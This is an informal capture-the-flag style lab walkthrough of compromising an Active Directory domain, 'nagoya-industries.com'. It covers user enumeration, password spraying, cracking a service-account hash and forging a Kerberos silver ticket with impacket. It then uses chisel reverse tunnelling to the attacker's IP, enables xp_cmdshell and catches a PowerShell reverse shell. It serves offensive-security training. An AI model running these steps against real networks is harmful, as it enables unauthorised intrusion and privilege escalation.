Going to generate some more usernames with First Initial. Last Name

Asked ChatGPT to create some usernames from this data

Okie this isn't working 

```
nxc smb $IP -u new-users.txt -p 'new-users.txt' --no-brute
```

Adding also FirstName.LastName to users file.

Validate usernames with kerbrute 

```
kerbrute userenum --dc $IP -d nagoya-industries.com new-users.txt
```

Oh 
![[PG/Active Directory/attachments/Pasted image 20250708153814.png]]
- this doesn't work... kerbrute did not add craig carr either as a valid user..

Cannot brute force using rockyou. I'd need to create a custom wordlist. The writeup said 'Spring2023' would work so I'm going with that.

Run strings with -e l flags against the executable

- got the hashies

This did crack the svc_mssql hash

Added this user to owned

Add helpdesk user to owned also 

Basically... Christopher Lewis is our target

- no flag :(

He does have SeMachinePrivilege.... does enabled mean disabled in AD

Sooo Because we have compromised a service account (svc_mssql) -> think SILVER TICKET ATTACK

# Priv Esc -> Silver Ticket Attack 

Using these creds 

```
-u 'svc_mssql' -p 'Service1'
```

## Tool impacket's ticketer

### Requirements 
- SPN password hash
- Domain SID
- Target SPN of the service account youâ€™ve compromised

1. Convert `Service1` to an NT hash
[Random site to do this](https://www.browserling.com/tools/ntlm-hash) 
![[PG/Active Directory/attachments/Pasted image 20250708194015.png]]

Here's the NT hash of Service1
```
E3A0168BC21CFB88B95C954A5B18F57C
```


2. Get the Domain SID 

It's in bloodhound 

![[PG/Active Directory/attachments/Pasted image 20250708194334.png]]
```
S-1-5-21-1969309164-1513403977-1686805993
```

Or run Get-AdDomain in WinRM shell
```
Get-AdDomain 
```

3. Get SPN of compromised service account 
```
MSSQL/nagoya.nagoya-industries.com
```

Also in Bloodhound 
![[PG/Active Directory/attachments/Pasted image 20250708194659.png]]

Or run this PowerShell

```
Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
```


### impacket-ticketer 

Use impacket's ticketer to perform the silver ticky attack 
```
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
```

![[PG/Active Directory/attachments/Pasted image 20250708194904.png]]
- YAS

Export the ticky 

```
export KRB5CCNAME=$PWD/Administrator.ccache
```

And run klist to verify

```
klist
```

![[PG/Active Directory/attachments/Pasted image 20250708195035.png]]

Create KRB5 file to connect in `/etc/krb5user.conf` ? optional? 

```
[libdefaults]  
        default_realm = NAGOYA-INDUSTRIES.COM  
        kdc_timesync = 1  
        ccache_type = 4  
        forwardable = true  
        proxiable = true  
    rdns = false  
    dns_canonicalize_hostname = false  
        fcc-mit-ticketflags = true  
  
[realms]          
        NAGOYA-INDUSTRIES.COM = {  
                kdc = nagoya.nagoya-industries.com  
        }  
  
[domain_realm]  
        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

### trying impacket's-mssqlclient 

```
impacket-mssqlclient -target-ip 192.168.194.21 -k -no-pass administrator@nagoya-industries.com
```

It fails :(
![[PG/Active Directory/attachments/Pasted image 20250708200153.png]]

### Port forwarding with Chisel
It's failing because the SQL service is running off of localhost only. Need to port forward with Chisel.exe

![[PG/Active Directory/attachments/Pasted image 20250708200233.png]]

Steps 

```
#set listener on kali
chisel server --port 445 --reverse  

#on victim machine
upload chisel.exe
.\chisel.exe client 192.168.45.204:445 R:1433:127.0.0.1:1433
```



![[PG/Active Directory/attachments/Pasted image 20250708201344.png]]

```
./agent.exe -connect 192.168.45.152:11601 -ignore-cert
```


![[PG/Active Directory/attachments/Pasted image 20250708201708.png]]

![[PG/Active Directory/attachments/Pasted image 20250708203010.png]]

Then rerun mssql

```
impacket-mssqlclient -k nagoya.nagoya-industries.com
```

Well Ligolo crashed. So 

Back to 

### Chisel

https://getcyber.me/posts/how-to-use-chisel-for-reverse-tunneling/

```
#set listener on kali
chisel server --port 445 --reverse  

#on victim machine
upload chisel.exe
.\chisel.exe client 192.168.45.152:445 R:1433:127.0.0.1:1433
```

Then the mssqlclient should work.


Then do xp_cmdshell

```
#you need to enable xp_cmdshell first
enable_xp_cmdshell  
xp_cmdshell <command>
```

![[PG/Active Directory/attachments/Pasted image 20250708213157.png]]

Use rev shells to generate a powershell reverse shell

![[PG/Active Directory/attachments/Pasted image 20250708213436.png]]

Next, paste the entire payload after the xp_cmdshell command within the shell.

xp_cmdshell command execution

![[PG/Active Directory/attachments/Pasted image 20250708213507.png]]

Catch reverse shell

![[PG/Active Directory/attachments/Pasted image 20250708213550.png]]
